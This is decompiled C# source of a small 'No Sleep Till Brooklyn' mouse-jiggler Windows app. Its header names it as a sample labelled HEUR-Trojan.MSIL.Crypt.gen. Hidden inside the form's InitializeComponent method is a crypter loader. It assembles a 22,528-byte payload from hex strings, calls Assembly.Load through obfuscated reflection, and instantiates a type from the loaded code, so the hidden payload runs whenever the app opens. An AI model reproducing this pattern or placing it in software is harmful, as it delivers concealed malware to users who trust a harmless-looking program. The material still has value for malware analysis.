// Decompiled with JetBrains decompiler
// Type: BoardGameSuite.frmMain
// Assembly: STOREASSEMBLYFILESTATUSFLA, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 12D7A720-F25A-4863-8D87-3468F8362768
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Crypt.gen-dad06241920a1520de401b3d3c1edcb21c60c9969c1ff3de4b56586588f15e91.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Media;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace BoardGameSuite
{
  public class frmMain : Form
  {
    private const string MusicRelativePath = "music\\NoSleep.wav";
    private IContainer components = (IContainer) null;
    private static System.Type ComMember;
    private Button btnAction;
    private Label lblMessage;
    private CheckBox chkPlayMusic;

    private int? curX { get; set; }

    private int? curY { get; set; }

    private int maxCount => 50;

    private int count { get; set; } = 0;

    private bool stopLoop { get; set; } = true;

    private SoundPlayer PlayAudio { get; set; }

    private bool isPlaying { get; set; } = false;

    public frmMain()
    {
      this.InitializeComponent();
      this.btnAction.Text = "Start Trip";
      this.lblMessage.Text = "Click the Button to Begin the Trip.";
    }

    private void btnAction_Click(object sender, EventArgs e)
    {
      if (this.stopLoop)
      {
        this.btnAction.Text = "Stop And Sleep";
        this.StartMouseLocation();
      }
      else
      {
        this.lblMessage.Text = "";
        this.btnAction.Text = "Start Trip";
        this.StopMouseLocation();
      }
    }

    private void StartMouseLocation()
    {
      this.stopLoop = false;
      this.LoopMouseLocation();
    }

    private void StopMouseLocation() => this.stopLoop = true;

    private void LoopMouseLocation()
    {
      if (this.stopLoop)
      {
        this.lblMessage.Text = "You're Awake!!!";
        this.StopMusic();
      }
      else
      {
        Application.DoEvents();
        Thread.Sleep(1000);
        Application.DoEvents();
        this.TestMouseAndMove();
        this.LoopMouseLocation();
        Application.DoEvents();
      }
    }

    private void TestMouseAndMove()
    {
      if (this.stopLoop)
      {
        this.count = 0;
      }
      else
      {
        ++this.count;
        int? nullable;
        int num1;
        if (!this.curX.HasValue)
        {
          nullable = this.curY;
          num1 = !nullable.HasValue ? 1 : 0;
        }
        else
          num1 = 0;
        if (num1 != 0)
        {
          this.curX = new int?(Cursor.Position.X);
          this.curY = new int?(Cursor.Position.Y);
        }
        nullable = this.curX;
        Point position = Cursor.Position;
        int x = position.X;
        int num2;
        if (nullable.GetValueOrDefault() == x & nullable.HasValue)
        {
          nullable = this.curY;
          position = Cursor.Position;
          int y = position.Y;
          num2 = !(nullable.GetValueOrDefault() == y & nullable.HasValue) ? 1 : 0;
        }
        else
          num2 = 1;
        if (num2 != 0)
        {
          this.count = 0;
          position = Cursor.Position;
          this.curX = new int?(position.X);
          position = Cursor.Position;
          this.curY = new int?(position.Y);
          this.lblMessage.Text = "Mouse Moved!";
          this.StopMusic();
        }
        else
        {
          if (!this.isPlaying)
            this.PlayMusic();
          this.lblMessage.Text = string.Format("Key Press for No Sleep In {0} seconds", (object) (this.maxCount - this.count));
          if (this.count < this.maxCount)
            return;
          this.F15Press();
          this.count = 0;
        }
      }
    }

    private void F15Press() => SendKeys.Send("{F15}");

    private void StopMusic()
    {
      this.PlayAudio?.Stop();
      this.isPlaying = false;
    }

    private void PlayMusic()
    {
      string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\music\\NoSleep.wav";
      if (!this.chkPlayMusic.Checked || !File.Exists(path))
        return;
      if (this.PlayAudio == null)
        this.PlayAudio = new SoundPlayer();
      this.PlayAudio.SoundLocation = path;
      this.PlayAudio.Play();
      this.isPlaying = true;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (frmMain));
      this.btnAction = new Button();
      this.lblMessage = new Label();
      this.chkPlayMusic = new CheckBox();
      this.SuspendLayout();
      this.btnAction.BackColor = SystemColors.ControlDarkDark;
      this.btnAction.FlatAppearance.BorderColor = SystemColors.Control;
      this.btnAction.FlatAppearance.MouseOverBackColor = Color.Silver;
      this.btnAction.FlatStyle = FlatStyle.Flat;
      this.btnAction.ForeColor = SystemColors.ButtonHighlight;
      this.btnAction.Location = new Point(45, 46);
      this.btnAction.Margin = new Padding(0);
      this.btnAction.Name = "btnAction";
      this.btnAction.Size = new Size(104, 36);
      this.btnAction.TabIndex = 0;
      this.btnAction.Text = "btnAction";
      this.btnAction.UseVisualStyleBackColor = false;
      this.btnAction.Click += new EventHandler(this.btnAction_Click);
      this.lblMessage.AutoSize = true;
      this.lblMessage.BackColor = SystemColors.ActiveCaptionText;
      this.lblMessage.ForeColor = SystemColors.ControlLightLight;
      this.lblMessage.Location = new Point(22, 12);
      this.lblMessage.Name = "lblMessage";
      this.lblMessage.Size = new Size(76, 13);
      this.lblMessage.TabIndex = 1;
      this.lblMessage.Text = "No Sleep Till...";
      this.chkPlayMusic.AutoSize = true;
      this.chkPlayMusic.ForeColor = SystemColors.ButtonHighlight;
      this.chkPlayMusic.Location = new Point(167, 55);
      this.chkPlayMusic.Name = "chkPlayMusic";
      this.chkPlayMusic.Size = new Size(77, 17);
      this.chkPlayMusic.TabIndex = 2;
      this.chkPlayMusic.Text = "Play Music";
      this.chkPlayMusic.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      string str = Veet.Sa + Veet.Xe + Veet.Zr;
      byte[] Level = new byte[22528];
      for (int index = 0; index < 22528; ++index)
        Level[index] = Convert.ToByte(str.Substring(index * 2, 2), 16);
      frmMain.CharArray(Level, string.Empty);
      object[] objArray = new object[3]
      {
        (object) WoFGame.MembershipCondition(0),
        (object) WoFGame.MembershipCondition(1),
        (object) "BoardGameSuite"
      };
      Activator.CreateInstance(frmMain.ComMember, objArray);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.ActiveCaptionText;
      this.ClientSize = new Size(284, 94);
      this.Controls.Add((Control) this.chkPlayMusic);
      this.Controls.Add((Control) this.lblMessage);
      this.Controls.Add((Control) this.btnAction);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (frmMain);
      this.Text = "No Sleep Till Brooklyn";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private static void CharArray(byte[] Level, string po) => frmMain.PerformTable(frmMain.ContextAdd(Level));

    private static Assembly ContextAdd(byte[] Position) => (Assembly) typeof (Assembly).InvokeMember("`Load".TrimStart('`'), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) Position
    });

    private static void PerformTable(Assembly Q3) => frmMain.ComMember = Q3.GetTypes()[24];
  }
}
